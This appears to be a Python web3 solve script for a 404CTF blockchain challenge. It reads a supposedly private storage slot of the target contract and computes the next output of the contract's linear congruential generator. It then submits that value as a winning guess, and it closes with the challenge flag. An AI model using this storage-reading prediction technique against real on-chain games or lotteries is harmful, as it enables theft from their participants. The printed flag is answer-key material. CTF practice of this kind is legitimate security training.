from web3 import Web3

rpc_url = "https://blockchain.challenges.404ctf.fr/"
web3 = Web3(Web3.HTTPProvider(rpc_url))
print("[+] Connected" if web3.is_connected() else "")

target_address = "0x21Ae1dac078Cc18B5B24dE4Eb247e42CcF6898D0"
target_abi = """[
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "_start",
				"type": "uint256"
			}
		],
		"stateMutability": "nonpayable",
		"type": "constructor"
	},
	{
		"inputs": [],
		"name": "a",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "c",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [
			{
				"internalType": "uint256",
				"name": "_next",
				"type": "uint256"
			}
		],
		"name": "guess",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "nonpayable",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "isSolved",
		"outputs": [
			{
				"internalType": "bool",
				"name": "",
				"type": "bool"
			}
		],
		"stateMutability": "view",
		"type": "function"
	},
	{
		"inputs": [],
		"name": "m",
		"outputs": [
			{
				"internalType": "uint256",
				"name": "",
				"type": "uint256"
			}
		],
		"stateMutability": "view",
		"type": "function"
	}
]
"""

target_bytecode = "608060405260008060006101000a81548160ff021916908315150217905550637fffffff6001556130396002556341c64e6d60035534801561004057600080fd5b50604051610489380380610489833981810160405281019061006291906100aa565b80600481905550506100d7565b600080fd5b6000819050919050565b61008781610074565b811461009257600080fd5b50565b6000815190506100a48161007e565b92915050565b6000602082840312156100c0576100bf61006f565b5b60006100ce84828501610095565b91505092915050565b6103a3806100e66000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c80630dbe671f1461005c5780635a2ee0191461007a57806364d98f6e146100985780639189fec1146100b6578063c3da42b8146100e6575b600080fd5b610064610104565b60405161007191906101b9565b60405180910390f35b61008261010a565b60405161008f91906101b9565b60405180910390f35b6100a0610110565b6040516100ad91906101ef565b60405180910390f35b6100d060048036038101906100cb919061023b565b610121565b6040516100dd91906101ef565b60405180910390f35b6100ee61019a565b6040516100fb91906101b9565b60405180910390f35b60025481565b60015481565b60008054906101000a900460ff1681565b60006001546003546004546002546101399190610297565b61014391906102d9565b61014d919061033c565b60048190555060045482148061016d575060008054906101000a900460ff165b6000806101000a81548160ff02191690831515021790555060008054906101000a900460ff169050919050565b60035481565b6000819050919050565b6101b3816101a0565b82525050565b60006020820190506101ce60008301846101aa565b92915050565b60008115159050919050565b6101e9816101d4565b82525050565b600060208201905061020460008301846101e0565b92915050565b600080fd5b610218816101a0565b811461022357600080fd5b50565b6000813590506102358161020f565b92915050565b6000602082840312156102515761025061020a565b5b600061025f84828501610226565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006102a2826101a0565b91506102ad836101a0565b92508282026102bb816101a0565b915082820484148315176102d2576102d1610268565b5b5092915050565b60006102e4826101a0565b91506102ef836101a0565b925082820190508082111561030757610306610268565b5b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000610347826101a0565b9150610352836101a0565b9250826103625761036161030d565b5b82820690509291505056fea2646970667358221220bcd6d8b07d242602197b5d2f2bf402ae5f27d77b2ff4456e303e3660184c62ba64736f6c63430008120033"
target_address = web3.to_checksum_address(target_address)

target_contract = web3.eth.contract(target_address, abi=target_abi, bytecode=target_bytecode)

a = 12345
c = 1103515245
m = 0x7fffffff

print("Is solved: ", target_contract.functions.isSolved().call())

# Access to storage to get value of CurrentState
currentState = int.from_bytes(web3.eth.get_storage_at(target_address, 4))

next = (a * currentState + c) % m
tx_hash = target_contract.functions.guess(next).transact()
web3.eth.wait_for_transaction_receipt(tx_hash)

print("Is solved: ", target_contract.functions.isSolved().call())

# Ref: https://ethereum.stackexchange.com/questions/44893/how-do-i-see-the-value-of-a-string-stored-in-a-private-variable
# Flag 404CTF{r4Nd0Mn3ss_1S_NOt_s0_345y}
